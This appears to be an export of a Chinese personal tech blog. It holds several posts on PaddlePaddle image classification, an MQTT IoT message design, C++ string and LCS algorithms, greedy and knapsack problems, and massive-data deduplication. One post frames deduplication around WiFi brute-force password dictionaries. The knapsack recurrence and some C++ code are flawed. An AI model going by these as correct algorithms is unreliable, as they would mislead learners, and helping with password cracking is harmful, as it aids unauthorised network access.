Cost %f, %s\" % ( event.pass_id, event.batch_id, event.cost, event.metrics)) else: sys.stdout.write('.') sys.stdout.flush() 这里我们先用PaddlePaddle内置的cifar10来测试一下能否训练起来，把上面的代码加上import之后： from __future__ import print_function, divisionimport paddle.v2 as paddleimport syspaddle.init(use_gpu=False, trainer_count=1)if __name__ == '__main__': train() 在主函数里面运行train()。见证奇迹的时刻到了。。 PaddlePaddle开始下载数据，并打印出了网络结构！ so far so good，PaddlePaddle开始训练网络！！！ 牛逼了我的哥。接下来我们用这个代码来保存网络训练之后的权重： try: trainer.train( reader=reader, num_passes=200, event_handler=event_handler, feeding=feeding)except KeyboardInterrupt: with open('params_model.tar', 'w') as f: parameters.to_tar(f) 最后，模型train好之后，导入模型进行预测： from __future__ import print_functionfrom PIL import Imageimport numpy as npimport osdef load_image(file): im = Image.open(file) im = im.resize((32, 32), Image.ANTIALIAS) im = np.array(im).astype(np.float32) # PIL打开图片存储顺序为H(高度)，W(宽度)，C(通道)。 # PaddlePaddle要求数据顺序为CHW，所以需要转换顺序。 im = im.transpose((2, 0, 1)) # CHW # CIFAR训练图片通道顺序为B(蓝),G(绿),R(红), # 而PIL打开图片默认通道顺序为RGB,因为需要交换通道。 im = im[(2, 1, 0),:,:] # BGR im = im.flatten() im = im / 255.0 return imtest_data = []cur_dir = os.getcwd()test_data.append((load_image(cur_dir + '/image/dog.png'),))# with open('params_pass_50.tar', 'r') as f:# parameters = paddle.parameters.Parameters.from_tar(f)probs = paddle.infer( output_layer=out, parameters=parameters, input=test_data)lab = np.argsort(-probs) # probs and lab are the results of one batch dataprint(\"Label of image/dog.png is: %d\" % lab[0][0]) OK, 本次列车到此结束，对于PaddlePaddle如何训练一个图片分类器，应该有了一个清醒的认识，下一步，我们将继续….用PaddlePaddle实现一个NLP情感分类器！ 本文由在当地较为英俊的男子金天大神原创，版权所有，欢迎转载，本文首发地址 https://jinfagang.github.io 。但请保留这段版权信息，多谢合作，有任何疑问欢迎通过微信联系我交流：jintianiloveu","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"universe的消息架构","slug":"universe的消息架构","date":"2017-09-27T02:58:58.000Z","updated":"2017-09-27T03:43:28.000Z","comments":true,"path":"2017/09/27/universe的消息架构/","link":"","permalink":"http://yoursite.com/2017/09/27/universe的消息架构/","excerpt":"Introduce something about universe的消息架构","text":"Introduce something about universe的消息架构 universe的消息架构 This article was original written by Jin Tian, welcome re-post, first come with https://jinfagang.github.io . but please keep this copyright info, thanks, any question could be asked via wechat: jintianiloveu universe的定义本篇博客设计并记录一下universe的消息架构。在我的宇宙中，所有消息满足下列条件： 我是上帝消息，必须能够抵达所有终端，在mqtt协议中被定义为master,这个权限是最高级且无法更改，只有我可以发号施令； Jarvis是消息处理的大脑，同时也是消息传递中枢，他必须订阅master消息，并且优先级最高，其次他需要订阅manager消息，manager也就是管理很多worker的经理，比如在树莓派上会有一个简单的manager实现，Jarvis通过接收这些manager的消息来做更上层次的处理，同时Jarvis也将接收worker发来的消息，这些worker是动作的直接执行终端； 最后是iris消息，这些iris是分布在各个用户手中的信使，其作用就是让每个iris可以和Jarvis实现对话，但是Jarvis不知道每个iris是谁（后期将添加iris本地化记忆）； 总的来说，消息体系架构应该是这样的： mastermanager/m_alicemanager/m_bobmanager/m_carenworker/lap/1iris/i_1iris/i_2 其实在Jarvis内部，只需要实现订阅： master, manager, worker, iris 四种类型的消息即可。然后可以建立一个字典, 或者说是mongoDB数据库： &#123; 'manager': [ &#123; 'name': 'alice', 'type': 'raspberrypi', 'workers': ['worker1', 'worker2'], 'duty': 'command all the arduino in bedroom' &#125;, &#123; 'name': 'bob', 'type': 'pc', 'workers': ['worker3', 'worker4'], 'duty': 'controll the wifi in home' &#125; ], 'worker': [ &#123; 'name': 'worker1', 'type': 'arduino', 'underlining': ['lap', 'motor'] &#125;, &#123; .... &#125; ], 'iris': [ &#123; 'name': ['小明', '明明', '大明'], 'client_id': '566yyyygfrr', 'client_type': 'go', &#125;, &#123; 'name': ['小明', '明明', '大明'], 'client_id': '566yyyygfrr', 'client_type': 'go', &#125; ]&#125; 另外，对于每个iris，根据client_id 都可以索引到一些信息，单独建立一个iris_info去保存这些信息。","categories":[{"name":"Default Category","slug":"Default-Category","permalink":"http://yoursite.com/categories/Default-Category/"}],"tags":[]},{"title":"有趣的算法问题之字符串专辑","slug":"有趣的算法问题之字符串专辑","date":"2017-09-06T12:17:17.000Z","updated":"2017-09-07T08:13:51.000Z","comments":true,"path":"2017/09/06/有趣的算法问题之字符串专辑/","link":"","permalink":"http://yoursite.com/2017/09/06/有趣的算法问题之字符串专辑/","excerpt":"本文介绍 有趣的算法问题之字符串专辑","text":"本文介绍 有趣的算法问题之字符串专辑 有趣的算法问题之字符串专辑 本文由在当地较为英俊的男子金天大神原创，版权所有，欢迎转载，本文首发地址 https://jinfagang.github.io 。但请保留这段版权信息，多谢合作，有任何疑问欢迎通过微信联系我交流：jintianiloveu 字符串问题字符串问题真的是经常遇到啊，小到匹配字符串，计算字符串相似度，大到海量数据统计搜索查询次数。好像都有字符串的身影。接下来就抛出几个厉害一点的字符串问题： 最长的无重复子字符串这个问题的思想跟求取子数组的最大和相似。说白了就是遍历字符串，一个一个遍历，维护一个maxNoRepeat的string，每次遍历添加到这个string里面去，根据HashTable判断是否在前面出现过，如果出现那么就放弃这个maxNoRepeat，同时将其复制给一个tempString，这个是我们要保存的记录前面一次的最长不重复子串，放弃当前的maxNoRepeat之后，再将重复的字符串出现的位置后面的那一个开始复制给maxNoRepeat，继续遍历。代码如下： #include &lt;iostream&gt;using namespace std;typedef struct Hash&#123; char c; int times; int lastPos;&#125;;string find_max_no_repeat(string a) &#123; string maxNoRepeat = \"\"; string tmp = \"\"; int n = 52; Hash *HashTable = new Hash[n]; for (int i = 0; i &lt; a.size(); ++i) &#123; // according to current char, update hash table int pos = (bool) islower(a[i]) ? (a[i] - 'a') : (a[i] - 'A' + n/2); if (HashTable[pos].times == 1) &#123; // indicates a[i] exist // be care of substring usage, begin index and len auto lastPos = HashTable[pos].lastPos; maxNoRepeat = a.substr(lastPos + 1, i - lastPos); tmp = maxNoRepeat.size() &gt; tmp.size()? maxNoRepeat: tmp; // clear HashTable, all char before last pos in a will be clear for (int k = 0; k &lt; HashTable[pos].lastPos; ++k) &#123; int tmpChar = a[k]; int aPos = (bool) islower(tmpChar) ? (tmpChar - 'a') : (tmpChar - 'A' + n/2); HashTable[aPos].lastPos = 0; HashTable[aPos].times = 0; &#125; // remember to update last pos HashTable[pos].lastPos = i; &#125; else &#123; maxNoRepeat += a[i]; cout &lt;&lt; maxNoRepeat &lt;&lt; endl; HashTable[pos].times = 1; HashTable[pos].lastPos = i; &#125; &#125; maxNoRepeat = maxNoRepeat.size() &gt; tmp.size()? maxNoRepeat: tmp; return maxNoRepeat;&#125;int main()&#123; string a = \"hgieophtpuaopwhrguf\"; cout &lt;&lt; a &lt;&lt; endl; string b = find_max_no_repeat(a); cout &lt;&lt; b &lt;&lt; endl;&#125; 看上去这个简单吗？简单你妈，老子骂了一天你敢信？我曹，这么说吧，没有看任何参考，完全自己骂出来的。这个问题的思路非常简单，就是维护一个中间值，遍历一遍字符串，维护一个哈希表，这个哈希表就是查找下一个字符是否出现过，如果出现过，那么就对字符进行截取，从上一次出现的位置截取，同时把它复制给中间值。但是别忘了还要维护哈希表，维护就是把每一次新增的字符之前的也就是最近一次重复的统统归于零，与此同时要更新一下当前重复的上次的位置。如此便可破此题。好吧，这是我写过最牛逼算法了，其实如果你直接手撸实现的话会有无数的坑，总结一下： 维护HashTable的时候，我是直接delete []，然后new，试图全部抹掉重新来，发现尼玛不行，这一点没有考虑抽取全，当前的字符串子串的HashTable还是不能变； HashTable找到一个重复元素时，要更新HashTable该元素的上一次位置，也就是当前位置，因为你重复之后你就需要截取字符，截取字符如果不改变当前重复字符的位置的话，还是上一次重复的位置，下一次截取就会出错。 好了，坑已踩完。","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"有趣的算法问题之真的有趣吗","slug":"有趣的算法问题之真的有趣吗","date":"2017-09-06T09:13:13.000Z","updated":"2017-09-06T12:38:16.000Z","comments":true,"path":"2017/09/06/有趣的算法问题之真的有趣吗/","link":"","permalink":"http://yoursite.com/2017/09/06/有趣的算法问题之真的有趣吗/","excerpt":"本文介绍 有趣的算法问题之真的有趣吗","text":"本文介绍 有趣的算法问题之真的有趣吗 有趣的算法问题之真的有趣吗 本文由在当地较为英俊的男子金天大神原创，版权所有，欢迎转载，本文首发地址 https://jinfagang.github.io 。但请保留这段版权信息，多谢合作，有任何疑问欢迎通过微信联系我交流：jintianiloveu 继续上一个继续说。说完了动态规划最优代表性的问题，该研究点其他的吧。贪心算法？ 贪心算法感觉贪心算法适合处理序列决策问题，也即是没有固定章法的问题，这个时候一个牛逼的题目出现在了你的面前：移动纸牌问题 假设有N堆纸牌，你现在需要在相邻的每两堆之间相互移动，使得最后每堆的数目相同，当然，纸牌的总数是N的倍数的，请问这样最少的移动次数是多少次？ 哇，好厉害的题目。其实也很简单，贪心算法其实得到的并不一定是最优的解法，你只需要实现它，既可以，你要证明它是最优，对不起，很难证明，只要你能够解决就是牛逼的。这个问题很好理解，我们假设有4堆排，分别为：9, 8, 17, 6, 很显然我们可以知道最终的平均值为10，我们归一化一下，全部剪掉10： -1, -2, 7, -4, 我们现在从第一个数开始，与后面的数相加； 0, -3, 7, -4, 0， 0，4, -4; 0, 0, 0, 0; 经过3次移动，最终变味了0. 代码就不写了，比较简单。 再来一个题目：背包问题背包问题其实也可以说是动态规划吧。我形象的描述一下背包问题：一群小偷去偷地主家的东西，地主家那是非常有钱啊，连脸盆都是金的，但是问题来了，他们只有一个能够装载空间为W的包，现在他们搜刮到物品有N件，每一件的价值和体积分别为Vi 和Wi。那么请问，小偷放入背包能够达到的最大价值是多少？ 我们要求的是这么一个值F(W, N)，也就是在给定W和N的情况下求这个值。我们这样思考，加入W或者N为0，那么肯定这个值也是0，因为没有背包或者没有物品都是没有价值的。如果都不为0我们思考两种情况： 如果不把最后一个物品放入背包，此时能够实现的最大价值为F(W, N-1); 这个时候最后一个物品有两个选择，要么放要么不放，假如放，那么放入之后的价值应该是F(W - Wn, N) + Vn，这个就是等于假如没有最后一个体积背包的情况下的最大值加上这最后一个物品，同时假如说不放，那么价值应该是或者说等于，没有这个物品，背包减少Wn时候的最大值，即F(W-Wn, N-1),综合两种情况就是 max{F(W - Wn, N) + Vn, F(W-Wn, N-1)} 上面的思路放到程序实现可以这样：new -&gt; F[W][N], V[N], W[N]F[0][N] = 0;F[W][0] = 0;if V[N] &gt; W, F[W][N] = F[W][N-1];if V[N] &lt;= W, F[W][N] = max{F[W][N-1], F[W-W[N]][N-1] + V[N]} 程序就不写了，有了这个思路，实现起来也是极其简单的。真正重要的是这个递归的思想。","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"有趣的算法问题之巧思妙想","slug":"有趣的算法问题之巧思妙想","date":"2017-09-06T01:09:09.000Z","updated":"2017-09-06T09:03:31.000Z","comments":true,"path":"2017/09/06/有趣的算法问题之巧思妙想/","link":"","permalink":"http://yoursite.com/2017/09/06/有趣的算法问题之巧思妙想/","excerpt":"本文介绍 有趣的算法问题之巧思妙想","text":"本文介绍 有趣的算法问题之巧思妙想 有趣的算法问题之巧思妙想 本文由在当地较为英俊的男子金天大神原创，版权所有，欢迎转载，本文首发地址 https://jinfagang.github.io 。但请保留这段版权信息，多谢合作，有任何疑问欢迎通过微信联系我交流：jintianiloveu 有趣的算法算法之所以有趣，在于他能够化繁为简，他能概括统御世间万物，将一个复杂的问题归结为一个非常简单的问题。其实所有高阶的算法，都可以用两个大的方法去解决，而且屡试不爽。分别是动态规划和贪心算法.我们先从一道动态规划的问题先说起吧。 动态规划问题 最长公共子序列问题(LCS)，给定两个序列X和Y，求他们之间最长的公共子序列。 哇，这题目感觉有点难啊。最长公共子序列问题其实可以归结为最最最最最简单的一个递推表达式，首先我们假设序列X元素个数为i，Y为j，C[i, j]表示最长公共子序列的长度。好那么问题就变成了，如何求取这个最长公共子序列的长度问题。公式也是非常简单 ==easy== :smile: $$C[i, j] = \\left{ \\begin{array}{lr} 0,\\quad if \\ x=0 \\, or \\ y=0 \\ C[i-1, j-1] + 1, \\quad if \\; i,j&gt;0 \\; , x_i=y_i \\ max{C[i, j-1], C[i-1, j]} , \\quad if \\ i,j&gt;0, \\ x_i\\neq x_j \\end{array} \\right. $$ 这个公式还是非常难打啊，大概就是这么一个意思吧。咋一看这个表达式很牛逼啊，你随便给我两个序列，我通过他就可以求出最长子序列的长度？闲话不多说，让我们直接上代码看一下到底有没有这么牛逼。 假如我们有两个序列，我们用字符串来表示吧 X=cnblogs, Y=belong, 肉眼可以看到最长子序列为blog。那么长度就是4，让我们看看到底有没有这么牛逼。 在这之前，我得理清一下思路，首先是这样的，我们求取的这个C[i, j]，实际上就是一个二维的矩阵，你想啊i是从0变到i，j是从0变到j，那一路求过来，不就是一个i行j列的矩阵吗？目标值就是最右下角的这个元素。既然如此那么变成就好办了。 // this code calculate the max length of common sub-sequence of 2 stringsint lcs_length(string a, string b) &#123; // given 2 string, return the LCS length // define a 2 dim array int matrix[a.size()+1][b.size()+1]; for (int i = 0; i &lt;= a.size(); ++i) &#123; matrix[i][0] = 0; &#125; for (int j = 0; j &lt;= b.size(); ++j) &#123; matrix[0][j] = 0; &#125; for(int i = 1; i &lt;= a.size(); i++) &#123; for(int j = 1; j &lt;= b.size(); j++) &#123; if (a[i-1] == b[j-1]) &#123; matrix[i][j] = matrix[i-1][j-1] + 1; &#125; else &#123; matrix[i][j] = matrix[i][j-1] &gt; matrix[i-1][j] ? matrix[i][j-1] : matrix[i-1][j]; &#125; &#125; &#125; return matrix[a.size()][b.size()];&#125; 很显然，这个函数可以正确的得到最长公共子串的长度。看上去还是很牛逼，但是其实道理也非常简单，无外乎就是上面的三个公式。那么你可能回问了，上面三个公式是怎么来的呢？其实就是一个非常简单的递推，假如说公共子串Z的最后一个元素是X的最后一个元素，那么肯定也是Y的最后元素，那如果将X去掉最后元素，Y去掉最后一个元素，最长公共子串就是去掉之后的+1，就是加去掉的这个嘛。那如果说最后一个元素都不是X， Y的最后元素，那更好办了，这个时候公共子串就是X和Y的中间某一个子串嘛，这个时候X去掉最后一个，再来求公共子串，还是一样啊，或者Y去掉一个，也是一样啊，就直接就等于X或者Y去掉一个的共同子串的最大值了。(有人会问，为什么不等于X，Y都去掉一个的最大值呢？也就是 $$ max{C[i-1, j-1], C[i-1, j-1]}$$， 这是不行的，原因很简单，你X去掉一个之后，最长子串就有可能包含Y的最后一个值了，你都去掉会减少很多种情况，不可取 )。 这个问题我们已经完成了历史性的一步： 可以求取两个序列的最长子序列的长度。， 那么下一步就是，怎么找到这个最长子序列。这一步思路是这样的： (你可能无法想象，我完成求最大公共子序列上调试C++代码踩了一下午坑，我曹，真的是天坑)。先说一下思路吧，非常复杂，首先在上面的函数里面我们给他传入一个pFlag的二维数组，注意这是一个指针，因为后面需要递归遍历他。在这个二维数组里面存储的大小和matrix是一样，只不过这里面存储的都是字符串，为了便于理解我存储为 : “left”, “up”, “left_up”，三种字符串，其实你如果自己画了matrix这个表，就会发现，其实可以通过这样的箭头去回溯这个最长子序列是什么，你会发现恰恰是箭头所指向的路径。然后我们用一个函数递归，根据箭头来找到对应的子序列。所有代码如下： #include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;void sub_sequence(int i, int j, string **pFlag, string a) &#123; if (i == 0 || j == 0) &#123; return; &#125; if (pFlag[i][j] == \"left_up\") &#123; sub_sequence(i - 1, j - 1, pFlag, a); cout &lt;&lt; a[i-1] &lt;&lt; \" \"; &#125; else &#123; if (pFlag[i][j] == \"left\") &#123; sub_sequence(i, j-1, pFlag, a); &#125; else &#123; sub_sequence(i-1, j, pFlag, a); &#125; &#125;&#125;int lcs_length(string a, string b, string **pFlag) &#123; // given 2 string, return the LCS length // define a 2 dim array int matrix[a.size()+1][b.size()+1]; for (int i = 0; i &lt;= a.size(); ++i) &#123; matrix[i][0] = 0; &#125; for (int j = 0; j &lt;= b.size(); ++j) &#123; matrix[0][j] = 0; &#125; for(int i = 1; i &lt;= a.size(); i++) &#123; for(int j = 1; j &lt;= b.size(); j++) &#123; if (a[i-1] == b[j-1]) &#123; matrix[i][j] = matrix[i-1][j-1] + 1; // using string to indicate location pFlag[i][j] = \"left_up\"; &#125; else &#123; if (matrix[i][j-1] &gt; matrix[i-1][j]) &#123; matrix[i][j] = matrix[i][j-1]; pFlag[i][j] = \"left\"; &#125; else &#123; matrix[i][j] = matrix[i-1][j]; pFlag[i][j] = \"up\"; &#125; &#125; &#125; &#125; return matrix[a.size()][b.size()];&#125;int main()&#123; string b = \"gheteuponthiop\"; string a = \"giothuphyo\"; // 这里应该是**pFlag, markdown渲染有问题，二维指针 auto ** pFlag = new string* [a.size() + 1]; for (int k = 0; k &lt;= a.size(); ++k) &#123; pFlag[k] = new string[b.size() + 1]; &#125; int l = lcs_length(a, b, pFlag); sub_sequence((int) a.size(), (int) b.size(), pFlag, a); cout &lt;&lt; endl; cout &lt;&lt; l &lt;&lt; endl; return 0;&#125; 收工！以后遇到求最大公共子序列问题就来我的博客！！！！ 写到这里发现并不是那么有趣了。很复杂啊。。。不过坚信那句，万变不离其宗。","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"算法终章：遗失的那一部分","slug":"算法终章：遗失的那一部分","date":"2017-09-04T12:02:02.000Z","updated":"2017-09-05T01:14:04.000Z","comments":true,"path":"2017/09/04/算法终章：遗失的那一部分/","link":"","permalink":"http://yoursite.com/2017/09/04/算法终章：遗失的那一部分/","excerpt":"本文介绍 算法终章：遗失的那一部分","text":"本文介绍 算法终章：遗失的那一部分 算法终章：遗失的那一部分 本文由在当地较为英俊的男子金天大神原创，版权所有，欢迎转载，本文首发地址 https://jinfagang.github.io 。但请保留这段版权信息，多谢合作，有任何疑问欢迎通过微信联系我交流：jintianiloveu 写给自己看的备忘录数据结构","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"C++ 经典算法集锦 三","slug":"C++_经典算法集锦_三","date":"2017-09-04T11:37:37.000Z","updated":"2017-09-05T02:19:33.000Z","comments":true,"path":"2017/09/04/C++_经典算法集锦_三/","link":"","permalink":"http://yoursite.com/2017/09/04/C++_经典算法集锦_三/","excerpt":"本文介绍 C++ 经典算法集锦 三","text":"本文介绍 C++ 经典算法集锦 三 C++ 经典算法集锦 三 本文由在当地较为英俊的男子金天大神原创，版权所有，欢迎转载，本文首发地址 https://jinfagang.github.io 。但请保留这段版权信息，多谢合作，有任何疑问欢迎通过微信联系我交流：jintianiloveu Algorithm 6. 字符串算法既然字符串经常出现，那我就记录一些字符串算法。首先是，用hash表查找，比如给一个字符串fierjggooi要找出第一个重复的字符，这里应该是i，因为i出现了两次，而且是首次出现。要怎么写呢？#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;// define a hash table structtypedef struct Hash&#123; char c; int times;&#125;;int find_first_repeat(string s) &#123; // find the first repeat char in s // we have all 52 chars int n = 52; Hash *HashTable; HashTable = new Hash[n]; for (int i = 0; i &lt; s.size(); ++i) &#123; int pos = islower(s[i])? (s[i] - 'a'): (s[i] - 'A' + n/2); if (!HashTable[pos].c) &#123; HashTable[pos].c = s[i]; HashTable[pos].times = 1; &#125; else &#123; HashTable[pos].times++; &#125; &#125; for (int j = 0; j &lt; s.size(); ++j) &#123; int pos = islower(s[j])? (s[j] - 'a'): (s[j] - 'A' + n/2); if (HashTable[pos].times &gt; 1) &#123; cout &lt;&lt; \"hash c: \" &lt;&lt; HashTable[pos].c &lt;&lt; endl; cout &lt;&lt; \"s: \" &lt;&lt; s[j] &lt;&lt; endl; cout &lt;&lt; j &lt;&lt; endl; return j; &#125; &#125; return -1;&#125;int main()&#123; string a = \"goigygyvtuty\"; // should get 'u' int p = find_first_repeat(a); if (p &gt;= 0) &#123; cout &lt;&lt; \"first repeat char is: \" &lt;&lt; a[p] &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; \"no repeat char.\\n\"; &#125; return 0;&#125; 其实也非常简单，只需要写一个hash表，记录每个字符对应出现的次数即可。说白了就是一个字典，只不过这里更加底层一些。","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"Siren-IoT服务器建造 五： 我在实验室控制寝室灯泡","slug":"Siren-IoT服务器建造_五:_我在实验室控制寝室灯泡","date":"2017-09-03T13:57:57.000Z","updated":"2017-09-09T06:08:45.000Z","comments":true,"path":"2017/09/03/Siren-IoT服务器建造_五:_我在实验室控制寝室灯泡/","link":"","permalink":"http://yoursite.com/2017/09/03/Siren-IoT服务器建造_五:_我在实验室控制寝室灯泡/","excerpt":"本文介绍 Siren-IoT服务器建造 五: 我在实验室控制寝室灯泡","text":"本文介绍 Siren-IoT服务器建造 五: 我在实验室控制寝室灯泡 Siren-IoT服务器建造 五: 我在实验室控制寝室灯泡 本文由在当地较为英俊的男子金天大神原创，版权所有，欢迎转载，本文首发地址 https://jinfagang.github.io 。但请保留这段版权信息，多谢合作，有任何疑问欢迎通过微信联系我交流：jintianiloveu 二话不说，现在Arduino上编译一下MQTT这话听起来很简单啊，但是感觉比较麻烦，我来试一下看。","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"万变不离其宗之海量数据处理实战","slug":"万变不离其宗之海量数据处理实战","date":"2017-09-03T11:34:34.000Z","updated":"2017-09-03T13:33:35.000Z","comments":true,"path":"2017/09/03/万变不离其宗之海量数据处理实战/","link":"","permalink":"http://yoursite.com/2017/09/03/万变不离其宗之海量数据处理实战/","excerpt":"本文介绍 万变不离其宗之海量数据处理实战","text":"本文介绍 万变不离其宗之海量数据处理实战 万变不离其宗之海量数据处理实战 本文由在当地较为英俊的男子金天大神原创，版权所有，欢迎转载，本文首发地址 https://jinfagang.github.io 。但请保留这段版权信息，多谢合作，有任何疑问欢迎通过微信联系我交流：jintianiloveu 问题一：牛逼到爆照的wifi暴力破解密码字典去重好了，前面已经说过了海量数据怎么处理，那么接下来要做的就是，思考一下如何应用到实战中去了。我现在有几个wifi密码字典，但是字典是由好几个小的wifi合在一起的，因为这样可以更好的测试所有密码，但是这里面肯定会有重复的密码，我们现在要去除掉这些重复密码。思路是这样的： 1. 对文件进行分而治之，化整为零，各个击破。设计一个hash函数，将文件存储到一个文件夹在，文件夹是所有的小文件;2. 用命令sort foo.txt|unique 进行挨个去重，或者遍历该文件夹下所有的小文件，去重。 或者我可以写成一个C++程序，说不定以后遇到其他大的数据还可以用。 问题二：种子爬虫去重问题是这样的，我写了一个种子爬虫的程序，但是这个爬虫会爬取很多重复的种子，这个非常难搞啊，重复的存入数据库对我来说既是空间的冗余也是以后查找的冗余，有没有办法解决呢？方案一，直接用postgresql对数据进行去重。但是这个指标不治本；方案二，对每个种子的infohash，再记录一下，变成一个小hash，每次插入数据的时候对比一下。","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"万变不离其宗之海量数据下的算法问题处理思路","slug":"万变不离其宗之海量数据下的算法问题处理思路","date":"2017-09-01T04:00:00.000Z","updated":"2017-09-03T11:24:54.000Z","comments":true,"path":"2017/09/01/万变不离其宗之海量数据下的算法问题处理思路/","link":"","permalink":"http://yoursite.com/2017/09/01/万变不离其宗之海量数据下的算法问题处理思路/","excerpt":"本文介绍 万变不离其宗之海量数据下的算法问题处理思路","text":"本文介绍 万变不离其宗之海量数据下的算法问题处理思路 万变不离其宗之海量数据下的算法问题处理思路 本文由在当地较为英俊的男子金天大神原创，版权所有，欢迎转载，但请保留这段版权信息，多谢合作，有任何疑问欢迎通过微信联系我交流：jintianiloveu 海量数据下的算法问题本文开篇就引入了一个很重要的问题，海量数据处理下的算法问题。这个不管是在求职还是在以后的工作中都是必须会碰到的问题。因此，我在这里单独开文一篇为大家讲解这一系列问题的缘起缘消。让大家不至于在海量数据中迷失自我。 既然是万变不离其宗，那么肯定所有的问题都可以追本溯源，返璞归真为几类具有共同特性的问题。这里，我们先列举出来，所有的海量数据算法问题，其实都可以被归纳成为这么几类： top K问题, 重复问题 , 排序问题。这三大问题，来头可不一般，你能遇到的所有大数据海量数据问题，不外呼这三类。 先祭大杀器在正式记录这三大问题之前，我必须得有必要祭出几个大杀器，这些方法在处理大数据问题上是通用的，也就是说这些方法都是最基本的套路，但是我尽量不研究的非常复杂。 位图法咋一看，这个名字很简单，但是实际上可不是这样的，这个方法的思想非常牛逼。我们从这么一个问题来看，假如有2.5亿个int的整数，给你一个整数，让你来判断一下，这个整数是否在这2.5亿个整数之中。要求速度尽可能的快，你会怎么办呢？很多人会说，我会非常机智的遍历一遍这些整数，如果没有一样的就不存在如果有就存在。没错，这没有错，但是假如又来了一个整数，又让你判断有没有在里面，这个时候你又得遍历一遍。这是非常不科学的做法。这个时候我们的位图法就牛逼的出现了。位图法比较适合于判断是否存在这样的问题，元素的状态比较少，元素的个数比较多的情况之下。那么具体咋么做呢，这样，非常简单明了就是，2.5亿个整数里面，我维护一个长度等于最大整数值得字符串，每个整数是否存在我就在该整数对应的位置置为1，比如，有{2, 4, 5, 6, 67, 5}这么几个整数，我维护一个 00…0000 67位的字符串。但是，如果你不知道整数的最大值，你至少需要一个长度2^32的字符串，因为整数的最大值就是2^32，(int占4个字节，因此是32位)，那这就最少是512M内存，从char的长度算内存会算吧，直接*8/2^20 就是M的单位。那这么说来就可以理解位图法了。 top K问题首先让我们来研究一下top k问题。杀器已经寄出，接下来我记录几个经典的大数据问题： 有1000万个身份证号以及他们对应的数据，身份证号可能重复，找出出现次数最多的身份证号。 有10000000个记录，这些查询串的重复度比较高，如果除去重复后，不超过3000000个。一个查询串的重复度越高，说明查询它的用户越多，也就是越热门。请统计最热门的10个查询串，要求使用的内存不能超过1GB。 有10个文件，每个文件1GB，每个文件的每一行存放的都是用户的query，每个文件的query都可能重复。按照query的频度排序。 有一个1GB大小的文件，里面的每一行是一个词，词的大小不超过16个字节，内存限制大小是1MB。返回频数最高的100个词。 提取某日访问网站次数最多的那个IP。 10亿个整数找出重复次数最多的100个整数。 搜索的输入信息是一个字符串，统计300万条输入信息中最热门的前10条，每次输入的一个字符串为不超过255B，内存使用只有1GB。 这些问题怎么解答，我们一起来慢慢思考吧，先放在这里。 重复问题重复问题包括去重，寻找共同的重复元素，等都是这个问题。同样的，这里也先把问题归并出来： 例如，已知某个文件内包含一些电话号码，每个号码为8位数字，统计不同号码的个数。 10亿个正整数，只有1个数重复出现过，要求在O(n)的时间里找出这个数。 给定a、b两个文件，各存放50亿个url，每个url各占用64B，要求在O(n)的时间里找出a、b文件共同的url。 给40亿个不重复的unsigned int的整数，没排过序的，然后再给一个数，如何快速判断这个数是否在那40亿个数当中？ 在这些问题里面，最简单最重要的就是去重问题，我吃完饭之后继续写。比如给你一个wifi密码字典，里面重复的密码会大大增加无用功，你得去掉，但是一个字典少则上万多则上千亿，非常大的数据，你怎么去重？终于吃完饭了，我们继续。刚才看到了一个看上去十分可行的方法：如果数据无法一次性读入内存，那么可以，首先设定一个hash函数，把每一行的字符串映射成为一个0-n（什么函数这么牛逼请告诉我），然后把文件分拆成为比如500个小文件，那么重复的字符串一定在相同的小包中，这个时候就可以对每个小包进行去重，方法很简单，一行命令sort foo1.txt|unique ，对所有的小包去重之后再合并起来就可以得到一个大文件啦。（话说把所有小文件合并到大文件有简单的可行方案否？） 总的来说，解决海量数据中的重复问题无外乎两大法宝： 分治法，hash到小文件，化整为零，各个击破； 位图法，这个貌似只适合于整数场合？比如电话号码，身份证号之类的？ BloomFilter算法这里就不一一介绍了，这个算法比较高端。 那最后看来，比较可行的还是分而治之比较靠谱一些。 排序问题最后是海量数据的排序问题。这个我就不一一说了。。。下一个博客，我将会实际的实战一下，用这些方法处理实际的大数据问题。","categories":[{"name":"默认分类","slug":"默认分类","permalink":"http://yoursite.com/categories/默认分类/"}],"tags":[]},{"title":"Siren IoT服务器建造 四：  蛋疼把后端push上云端","slug":"Siren_IoT服务器建造_四:__蛋疼把后端push上云端","date":"2017-08-31T08:56:56.000Z","updated":"2017-09-09T06:08:57.000Z","comments":true,"path":"2017/08/31/Siren_IoT服务器建造_四:__蛋疼把后端push上云端/","link":"","permalink":"http://yoursite.com/2017/08/31/Siren_IoT服务器建造_四:__蛋疼把后端push上云端/","excerpt":"本文介绍 Siren IoT服务器建造 四: 蛋疼把后端push上云端","text":"本文介绍 Siren IoT服务器建造 四: 蛋疼把后端push上云端 Siren IoT服务器建造 四: 蛋疼把后端push上云端 本文由在当地较为英俊的男子金天大神原创，版权所有，欢迎转载，但请保留这段版权信息，多谢合作，有任何疑问欢迎通过微信联系我交流：jintianiloveu Siren上云上一篇我们已经把Jarvis建造的差不多了，在对Arduino进行改造之前，我们需要对服务端进行一个搭建，其实也非常简单，直接把siren deploy到云端即可。就是在这儿个关键的时刻，不管是腾讯云还是阿里云都有一个蛋疼的问题那就是端口没有被开放，没有被开放就意味着根本无法访问啊。 腾讯云配置了安全组还是无法访问1883号端口; 阿里云配置了安全组依旧无法访问1993号端口; 